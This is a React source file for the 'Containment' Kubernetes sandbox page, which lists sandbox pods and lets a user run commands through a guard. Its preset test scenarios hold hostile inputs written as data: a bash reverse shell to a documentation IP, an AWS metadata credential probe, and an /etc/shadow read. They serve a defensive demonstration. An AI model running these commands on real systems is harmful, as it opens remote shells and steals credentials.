import { createFileRoute, Link } from "@tanstack/react-router";
import { useMutation, useQuery, useQueryClient } from "@tanstack/react-query";
import { useServerFn } from "@tanstack/react-start";
import { useState } from "react";
import { toast } from "sonner";
import {
  Boxes,
  Cpu,
  Layers,
  Lock,
  Play,
  Radio,
  RefreshCw,
  Server,
  ShieldAlert,
  ShieldCheck,
  Terminal,
  Trash2,
  Zap,
} from "lucide-react";
import { AppShell } from "@/components/guard/app-shell";
import { KubernetesSandboxHud } from "@/components/guard/k8s-sandbox-hud";
import { KubernetesExecutionDrawer } from "@/components/guard/k8s-execution-drawer";
import { VerdictBadge, RiskMeter } from "@/components/guard/verdict-badge";
import { useFlowProgress } from "@/lib/flow";
import {
  getActiveSandboxPods,
  getSandboxClusterStatus,
  executeInKubernetesSandbox,
  terminateSandboxSession,
} from "@/lib/sandbox.functions";
import type { GuardedSandboxExecution } from "@/lib/sandbox/k8s-sandbox.server";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { cn } from "@/lib/utils";
import type { ActionType } from "@/lib/guard/types";

export const Route = createFileRoute("/_authenticated/sandbox")({
  head: () => ({
    meta: [
      { title: "Kubernetes Sandbox — Containment" },
      {
        name: "description",
        content: "Inspect and manage isolated Kubernetes Sandbox Pods with Pod Security Standards and NetworkPolicy boundaries.",
      },
    ],
  }),
  component: SandboxPage,
});

const QUICK_TESTS: Array<{ label: string; type: ActionType; command?: string; url?: string; path?: string; note: string }> = [
  {
    label: "Safe: npm list in sandbox",
    type: "shell",
    command: "npm list --depth=0",
    note: "Safe command. Allowed by Containment and executed inside the K8s sandbox pod.",
  },
  {
    label: "Safe: inspect package.json",
    type: "file_read",
    path: "/workspace/package.json",
    note: "Workspace read. Allowed by Containment and mounted emptyDir volume.",
  },
  {
    label: "Attack: Reverse shell escape attempt",
    type: "shell",
    command: "bash -i >& /dev/tcp/198.51.100.23/4444 0>&1",
    note: "Malicious escape attempt. Intercepted by Containment before ever reaching the pod!",
  },
  {
    label: "Attack: AWS Metadata credential theft",
    type: "network",
    url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    note: "Cloud metadata probe. Intercepted by Containment and blocked by K8s NetworkPolicy.",
  },
  {
    label: "Attack: Host filesystem traversal (/etc/shadow)",
    type: "file_read",
    path: "/etc/shadow",
    note: "System shadow read. Blocked by Containment and rejected by read-only rootfs.",
  },
];

function SandboxPage() {
  const queryClient = useQueryClient();
  const getStatus = useServerFn(getSandboxClusterStatus);
  const getPods = useServerFn(getActiveSandboxPods);
  const executeInK8s = useServerFn(executeInKubernetesSandbox);
  const terminateSession = useServerFn(terminateSandboxSession);

  const [testType, setTestType] = useState<ActionType>("shell");
  const [testInput, setTestInput] = useState("npm list --depth=0");
  const [executionResult, setExecutionResult] = useState<GuardedSandboxExecution | null>(null);

  const { data: cluster, isLoading: isClusterLoading, refetch: refetchCluster } = useQuery({
    queryKey: ["k8s-cluster-status"],
    queryFn: () => getStatus(),
    refetchInterval: 10_000,
  });

  const { data: pods, refetch: refetchPods } = useQuery({
    queryKey: ["k8s-sandbox-pods"],
    queryFn: () => getPods(),
    refetchInterval: 8_000,
  });

  const execMutation = useMutation({
    mutationFn: async () => {
      const actionPayload: Record<string, unknown> = {
        type: testType,
        agent_id: "sandbox-playground-agent",
      };
      if (testType === "shell") actionPayload["command"] = testInput;
      else if (testType === "file_read" || testType === "file_write") actionPayload["path"] = testInput;
      else if (testType === "network") actionPayload["url"] = testInput;

      return executeInK8s({
        data: {
          action: actionPayload,
          sessionId: "sandbox-playground",
        },
      });
    },
    onSuccess: (result) => {
      setExecutionResult(result);
      queryClient.invalidateQueries({ queryKey: ["k8s-sandbox-pods"] });
      queryClient.invalidateQueries({ queryKey: ["k8s-cluster-status"] });
      if (result.executedInSandbox) {
        toast.success(`Action executed inside Kubernetes Sandbox pod (exit ${result.sandbox?.exitCode})`);
      } else {
        toast.error(`Quarantined: ${result.reasonIfSkipped}`);
      }
    },
    onError: (err) => toast.error(err instanceof Error ? err.message : "Execution failed"),
  });

  const terminateMutation = useMutation({
    mutationFn: (sessionId: string) => terminateSession({ data: { sessionId } }),
    onSuccess: () => {
      toast.success("Sandbox pod terminated.");
      queryClient.invalidateQueries({ queryKey: ["k8s-sandbox-pods"] });
      queryClient.invalidateQueries({ queryKey: ["k8s-cluster-status"] });
    },
  });

  const [overrideUnlock, setOverrideUnlock] = useState(false);
  const { stages, loading: flowLoading } = useFlowProgress();
  const sandboxStage = stages.find((s) => s.key === "sandbox");
  const isLocked = !overrideUnlock && !flowLoading && sandboxStage && !sandboxStage.unlocked;

  if (isLocked) {
    return (
      <AppShell>
        <div className="mx-auto max-w-xl py-16">
          <Card className="border-border/60 bg-card/60 backdrop-blur p-8 text-center shadow-lg">
            <div className="mx-auto mb-4 flex size-14 items-center justify-center rounded-2xl border border-warning/30 bg-warning/10 text-warning">
              <Lock className="size-6" />
            </div>
            <h2 className="text-xl font-semibold tracking-tight">Kubernetes Sandbox Locked</h2>
            <p className="mx-auto mt-2 max-w-md text-sm text-muted-foreground">
              {sandboxStage.lockedHint || "Complete an agent run first in step 02 to unlock in-pod container execution and real-time pod telemetry."}
            </p>
            <div className="mt-6 flex flex-wrap justify-center gap-3">
              <Button asChild>
                <Link to="/agent-run">
                  <Play className="mr-2 size-4" />
                  Go to Live Agent Run
                </Link>
              </Button>
              <Button variant="outline" onClick={() => setOverrideUnlock(true)}>
                <Zap className="mr-2 size-4 text-primary" />
                Unlock Sandbox Now
              </Button>
            </div>
          </Card>
        </div>
      </AppShell>
    );
  }

  return (
    <AppShell>
      <div className="space-y-6">
        <header className="flex flex-wrap items-center justify-between gap-4">
          <div>
            <div className="flex items-center gap-2">
              <Boxes className="size-6 text-primary" />
              <h1 className="text-xl font-semibold tracking-tight">Kubernetes Sandbox Runtime</h1>
            </div>
            <p className="mt-1 text-sm text-muted-foreground">
              Isolated, hardened container execution tier. Allowed agent operations run inside sandboxed pods under strict Pod Security Standards.
            </p>
          </div>
          <Button
            variant="outline"
            size="sm"
            onClick={() => {
              void refetchCluster();
              void refetchPods();
            }}
            disabled={isClusterLoading}
          >
            <RefreshCw className={cn("size-3.5 mr-1.5", isClusterLoading && "animate-spin")} />
            Refresh Status
          </Button>
        </header>

        {/* Global Sandbox HUD */}
        <KubernetesSandboxHud isExecuting={execMutation.isPending} />

        {/* Cluster Specs and Security Context */}
        <div className="grid gap-4 md:grid-cols-3">
          <Card>
            <CardHeader className="pb-3">
              <CardTitle className="flex items-center gap-2 text-sm">
                <Server className="size-4 text-primary" />
                Cluster Endpoint
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-2 text-xs">
              <div className="flex justify-between">
                <span className="text-muted-foreground">Status:</span>
                <span className="font-medium text-success flex items-center gap-1">
                  <Radio className="size-2 animate-pulse" /> Active
                </span>
              </div>
              <div className="flex justify-between">
                <span className="text-muted-foreground">Mode:</span>
                <span className="font-mono text-foreground">{cluster?.mode ?? "emulated"}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-muted-foreground">K8s Version:</span>
                <span className="font-mono text-foreground">{cluster?.clusterVersion ?? "v1.34.1"}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-muted-foreground">Namespace:</span>
                <span className="font-mono text-primary font-medium">{cluster?.namespace ?? "containment-sandbox"}</span>
              </div>
            </CardContent>
          </Card>

          <Card>
            <CardHeader className="pb-3">
              <CardTitle className="flex items-center gap-2 text-sm">
                <ShieldCheck className="size-4 text-success" />
                Pod Security Profile
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-2 text-xs">
              <div className="flex justify-between">
                <span className="text-muted-foreground">Standard:</span>
                <span className="font-mono text-success font-medium">restricted</span>
              </div>
              <div className="flex justify-between">
                <span className="text-muted-foreground">User / Group:</span>
                <span className="font-mono text-foreground">UID 1000 (Non-root)</span>
              </div>
              <div className="flex justify-between">
                <span className="text-muted-foreground">Linux Capabilities:</span>
                <span className="font-mono text-foreground">drop: [ALL]</span>
              </div>
              <div className="flex justify-between">
                <span className="text-muted-foreground">Root Filesystem:</span>
                <span className="font-mono text-warning">readOnlyRootFilesystem</span>
              </div>
            </CardContent>
          </Card>

          <Card>
            <CardHeader className="pb-3">
              <CardTitle className="flex items-center gap-2 text-sm">
                <Cpu className="size-4 text-warning" />
                Quota & Runtime Isolation
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-2 text-xs">
              <div className="flex justify-between">
                <span className="text-muted-foreground">RuntimeClass:</span>
                <span className="font-mono text-foreground">{cluster?.runtimeClass ?? "runsc (gVisor)"}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-muted-foreground">NetworkPolicy:</span>
                <span className="font-mono text-success">Deny Ingress / Egress Allowlist</span>
              </div>
              <div className="flex justify-between">
                <span className="text-muted-foreground">Active Pods:</span>
                <span className="font-mono text-foreground">{cluster?.quotaUsage.pods ?? "0 / 30"}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-muted-foreground">Memory Quota:</span>
                <span className="font-mono text-foreground">{cluster?.quotaUsage.memoryRequests ?? "256Mi / 16Gi"}</span>
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Interactive Sandbox Playground */}
        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2 text-base">
              <Terminal className="size-4 text-primary" />
              Interactive Kubernetes Sandbox Playground
            </CardTitle>
            <CardDescription>
              Test any command, filesystem operation, or network egress in real-time. Notice how Containment evaluates risk first:
              safe commands run inside the sandbox pod; attacks are quarantined before touching Kubernetes.
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            {/* Quick Test Chips */}
            <div>
              <p className="text-xs font-medium text-muted-foreground mb-2">Preset Test Scenarios:</p>
              <div className="flex flex-wrap gap-2">
                {QUICK_TESTS.map((test) => (
                  <button
                    key={test.label}
                    type="button"
                    onClick={() => {
                      setTestType(test.type);
                      setTestInput(test.command || test.url || test.path || "");
                    }}
                    className={cn(
                      "rounded-full border px-3 py-1 text-xs transition-colors",
                      test.label.startsWith("Safe")
                        ? "border-success/40 bg-success/5 hover:bg-success/15 text-foreground"
                        : "border-destructive/40 bg-destructive/5 hover:bg-destructive/15 text-foreground",
                    )}
                  >
                    {test.label}
                  </button>
                ))}
              </div>
            </div>

            {/* Input Form */}
            <div className="flex flex-col gap-3 sm:flex-row">
              <div className="w-full sm:w-44">
                <Select
                  value={testType}
                  onValueChange={(val) => setTestType(val as ActionType)}
                >
                  <SelectTrigger>
                    <SelectValue placeholder="Action Type" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="shell">Shell Command</SelectItem>
                    <SelectItem value="file_read">File Read</SelectItem>
                    <SelectItem value="file_write">File Write</SelectItem>
                    <SelectItem value="network">Network Call</SelectItem>
                    <SelectItem value="tool_call">Tool Call</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              <Input
                value={testInput}
                onChange={(e) => setTestInput(e.target.value)}
                placeholder="Enter command, path, or URL..."
                className="font-mono text-sm"
                onKeyDown={(e) => {
                  if (e.key === "Enter") void execMutation.mutate();
                }}
              />
              <Button
                onClick={() => void execMutation.mutate()}
                disabled={execMutation.isPending || !testInput.trim()}
                className="shrink-0"
              >
                <Play className="size-4 mr-1.5" />
                {execMutation.isPending ? "Executing…" : "Run in Sandbox"}
              </Button>
            </div>

            {/* Execution Result Area */}
            {executionResult && (
              <div className="mt-4 rounded-lg border border-border bg-surface/50 p-4 space-y-3">
                <div className="flex flex-wrap items-center justify-between gap-3 border-b border-border/60 pb-3">
                  <div className="flex items-center gap-3">
                    <VerdictBadge verdict={executionResult.guard.verdict} />
                    <RiskMeter score={executionResult.guard.risk_score} />
                    <span className="font-mono text-xs text-muted-foreground">
                      {executionResult.executedInSandbox ? "dispatched to k8s" : "quarantined"}
                    </span>
                  </div>
                  {executionResult.pod && (
                    <span className="font-mono text-xs text-primary">
                      Pod: {executionResult.pod.name} ({executionResult.pod.ip})
                    </span>
                  )}
                </div>

                <p className="text-sm">{executionResult.guard.summary}</p>

                {executionResult.executedInSandbox ? (
                  <KubernetesExecutionDrawer result={executionResult.sandbox ?? null} />
                ) : (
                  <KubernetesExecutionDrawer
                    blocked={true}
                    reason={executionResult.reasonIfSkipped ?? null}
                  />
                )}
              </div>
            )}
          </CardContent>
        </Card>

        {/* Active Pods Table */}
        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2 text-base">
              <Boxes className="size-4 text-primary" />
              Active Sandbox Pods ({pods?.length ?? 0})
            </CardTitle>
            <CardDescription>
              Ephemeral pod instances provisioned for agent execution sessions in the {cluster?.namespace ?? "containment-sandbox"} namespace.
            </CardDescription>
          </CardHeader>
          <CardContent>
            {(!pods || pods.length === 0) ? (
              <div className="rounded-md border border-dashed border-border p-8 text-center text-xs text-muted-foreground">
                No active sandbox pods. Run an action in the playground or live agent run to provision a sandbox pod.
              </div>
            ) : (
              <div className="overflow-x-auto">
                <table className="w-full text-left text-xs">
                  <thead>
                    <tr className="border-b border-border text-muted-foreground">
                      <th className="pb-2 font-medium">Pod Name</th>
                      <th className="pb-2 font-medium">Namespace</th>
                      <th className="pb-2 font-medium">Status</th>
                      <th className="pb-2 font-medium">IP</th>
                      <th className="pb-2 font-medium">Image</th>
                      <th className="pb-2 font-medium">Runtime</th>
                      <th className="pb-2 font-medium text-right">Actions</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-border/60">
                    {pods.map((pod) => (
                      <tr key={pod.id} className="font-mono">
                        <td className="py-2.5 font-medium text-primary">{pod.name}</td>
                        <td className="py-2.5 text-muted-foreground">{pod.namespace}</td>
                        <td className="py-2.5">
                          <span className="inline-flex items-center rounded-full bg-success/15 px-2 py-0.5 text-[10px] text-success">
                            {pod.status}
                          </span>
                        </td>
                        <td className="py-2.5 text-muted-foreground">{pod.ip}</td>
                        <td className="py-2.5 text-muted-foreground">{pod.image}</td>
                        <td className="py-2.5 text-muted-foreground">
                          {pod.securityContext.runtimeClassName ?? "gvisor"}
                        </td>
                        <td className="py-2.5 text-right">
                          <Button
                            variant="ghost"
                            size="sm"
                            className="h-7 text-destructive hover:bg-destructive/10"
                            onClick={() => terminateMutation.mutate(pod.sessionId)}
                            disabled={terminateMutation.isPending}
                          >
                            <Trash2 className="size-3 mr-1" />
                            Terminate
                          </Button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </CardContent>
        </Card>
      </div>
    </AppShell>
  );
}
